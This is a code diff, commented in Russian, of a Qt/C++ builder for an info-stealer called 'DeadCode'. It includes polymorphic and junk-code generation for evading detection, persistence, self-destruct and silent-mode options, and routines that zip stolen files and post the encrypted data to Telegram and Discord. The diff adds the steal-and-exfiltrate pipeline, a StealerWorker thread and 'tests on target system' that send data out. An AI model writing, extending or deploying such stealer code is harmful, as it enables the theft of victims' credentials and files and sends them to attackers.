@@ -30,7 +30,7 @@
 #include <QFileDialog>
 #include <QMessageBox>
 #include <QSettings>
-#include <QVBoxLayout> // Добавлено для исправления ошибки 3
+#include <QVBoxLayout>
 #include <mutex>
 #include <thread>
 #include <memoryapi.h>
@@ -40,7 +40,7 @@
 #include "build_key.h"
 #include "polymorphic_code.h"
 #include "junk_code.h"
-#include "workerthread.h" // Добавлено для исправления ошибки 5
+#include "stealerworker.h"
 
 // Определение NT_SUCCESS, если он отсутствует
 #ifndef NT_SUCCESS
@@ -1075,7 +1075,7 @@ MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWi
     silentCheckBox = new QCheckBox("Silent Mode", this);
     autoStartCheckBox = new QCheckBox("Auto Start", this);
     persistCheckBox = new QCheckBox("Persist", this);
-    selfDestructCheckBox = new QCheckBox("Self Destruct", this); // Добавлено для полноты конфигурации
+    selfDestructCheckBox = new QCheckBox("Self Destruct", this);
     textEdit = new QTextEdit(this);
     iconBrowseButton = new QPushButton("Browse Icon", this);
     buildButton = new QPushButton("Build", this);
@@ -1476,7 +1476,7 @@ void MainWindow::sendToTelegram(const std::string& encryptedData, const std::vec
     QNetworkReply* reply = manager->post(request, multiPart);
     multiPart->setParent(reply);
 
-    connect(reply, &QNetworkReply::finished, this, [this, reply]() { // Исправлено для ошибки 6
+    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
         replyFinished(reply);
     });
 }
@@ -1518,7 +1518,7 @@ void MainWindow::sendToDiscord(const std::string& encryptedData, const std::vect
     QNetworkReply* reply = manager->post(request, multiPart);
     multiPart->setParent(reply);
 
-    connect(reply, &QNetworkReply::finished, this, [this, reply]() { // Исправлено для ошибки 6
+    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
         replyFinished(reply);
     });
 }
@@ -1561,6 +1561,22 @@ void MainWindow::generateBuildKeyHeader() {
     }
 }
 
+// Добавление генерации мусорного кода с использованием junk_code.h
+void MainWindow::generateJunkCode() {
+    std::string junkCode = GenerateJunkCode();
+    std::ofstream outFile("junk_code_generated.h");
+    if (outFile.is_open()) {
+        outFile << "#ifndef JUNK_CODE_GENERATED_H\n";
+        outFile << "#define JUNK_CODE_GENERATED_H\n\n";
+        outFile << junkCode;
+        outFile << "\n#endif // JUNK_CODE_GENERATED_H\n";
+        outFile.close();
+        Log(QString("Junk code generated and saved to junk_code_generated.h"));
+    } else {
+        Log(QString("Failed to generate junk code"));
+    }
+}
+
 void MainWindow::copyIconToBuild() {
     if (config.iconPath.empty()) {
         Log(QString("No icon path specified"));
@@ -1586,16 +1602,55 @@ void MainWindow::buildExecutable() {
     isBuilding = true;
     Log(QString("Starting build process..."));
 
+    // Генерация необходимых файлов
     generatePolymorphicCode();
     generateBuildKeyHeader();
+    generateJunkCode(); // Добавляем генерацию мусорного кода
     copyIconToBuild();
 
-    // Имитация сборки (в реальном проекте здесь будет вызов компилятора)
+    // Проверка зависимостей перед сборкой
+    if (!checkDependencies()) {
+        Log(QString("Dependency check failed, aborting build"));
+        isBuilding = false;
+        return;
+    }
+
+    // Имитация сборки (в реальном проекте здесь будет вызов компилятора, например, MSBuild или CMake)
     QTimer::singleShot(2000, this, [this]() {
         Log(QString("Build completed: ") + QString::fromStdString(config.filename));
         isBuilding = false;
         emit startStealSignal();
     });
+}
+
+// Проверка зависимостей
+bool MainWindow::checkDependencies() {
+    // Проверка наличия необходимых библиотек
+    const char* requiredLibs[] = {
+        "bcrypt.dll",  // Для libbcrypt
+        "libzip.dll",  // Для libzip
+        "sqlite3.dll", // Для libsqlite3
+        "libcurl.dll", // Для libcurl
+        "libssl.dll",  // Для libssl
+        "libcrypto.dll", // Для libcrypto
+        nullptr
+    };
+
+    bool allLibsPresent = true;
+    for (int i = 0; requiredLibs[i]; i++) {
+        if (!GetModuleHandleA(requiredLibs[i])) {
+            Log(QString::fromStdString("Missing dependency: " + std::string(requiredLibs[i])));
+            allLibsPresent = false;
+        }
+    }
+
+    if (!allLibsPresent) {
+        Log(QString("One or more dependencies are missing. Please ensure all required libraries are installed."));
+        return false;
+    }
+
+    Log(QString("All dependencies are present."));
+    return true;
 }
 
 void MainWindow::triggerGitHubActions() {
@@ -1792,6 +1847,15 @@ void MainWindow::StealAndSendData(const std::string& dir) {
         } catch (const std::exception& e) {
             Log(QString::fromStdString("Failed to encrypt data: " + std::string(e.what())));
             return;
+        }
+    }
+
+    // Создание ZIP архива для файлов
+    if (!collectedFiles.empty()) {
+        std::string zipPath = CreateZipArchive(dir, collectedFiles);
+        if (!zipPath.empty()) {
+            collectedFiles.clear();
+            collectedFiles.push_back(zipPath);
         }
     }
 
@@ -2320,6 +2384,34 @@ std::string CreateZipArchive(const std::string& dir, const std::vector<std::stri
     return zipPath;
 }
 
+// Тестирование на целевой системе
+void MainWindow::runTests() {
+    Log(QString("Running tests on target system..."));
+
+    // Тест 1: Проверка шифрования и дешифрования
+    std::string testData = "Test data for encryption";
+    std::string encrypted = EncryptData(testData, config.encryptionKey1, config.encryptionKey2, config.encryptionSalt);
+    std::string decrypted = DecryptData(encrypted);
+    if (testData == decrypted) {
+        Log(QString("Encryption/Decryption test passed"));
+    } else {
+        Log(QString("Encryption/Decryption test failed"));
+    }
+
+    // Тест 2: Проверка генерации мусорного кода
+    generateJunkCode();
+    if (std::filesystem::exists("junk_code_generated.h")) {
+        Log(QString("Junk code generation test passed"));
+    } else {
+        Log(QString("Junk code generation test failed"));
+    }
+
+    // Тест 3: Проверка отправки данных
+    std::vector<std::string> testFiles;
+    sendData(QString::fromStdString("Test data"), testFiles);
+    Log(QString("Send data test completed (check logs for success)"));
+}
+
 int main(int argc, char *argv[]) {
     // Инициализация GDI+
     Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
@@ -2329,17 +2421,20 @@ int main(int argc, char *argv[]) {
     MainWindow w;
     w.show();
 
-    // Запуск WorkerThread для выполнения задач в фоновом режиме
-    WorkerThread* worker = new WorkerThread(&w);
+    // Запуск StealerWorker для выполнения задач в фоновом режиме
+    StealerWorker* worker = new StealerWorker(&w, std::string(getenv("TEMP")) + "\\DeadCode_" + w.generateRandomString(8));
     QThread* thread = new QThread;
     worker->moveToThread(thread);
 
-    QObject::connect(thread, &QThread::started, worker, &WorkerThread::run);
-    QObject::connect(worker, &WorkerThread::finished, thread, &QThread::quit);
-    QObject::connect(worker, &WorkerThread::finished, worker, &WorkerThread::deleteLater);
+    QObject::connect(thread, &QThread::started, worker, &StealerWorker::process);
+    QObject::connect(worker, &StealerWorker::finished, thread, &QThread::quit);
+    QObject::connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
     QObject::connect(thread, &QThread::finished, thread, &QThread::deleteLater);
 
     thread->start();
+
+    // Запуск тестов на целевой системе
+    w.runTests();
 
     int result = app.exec();
 
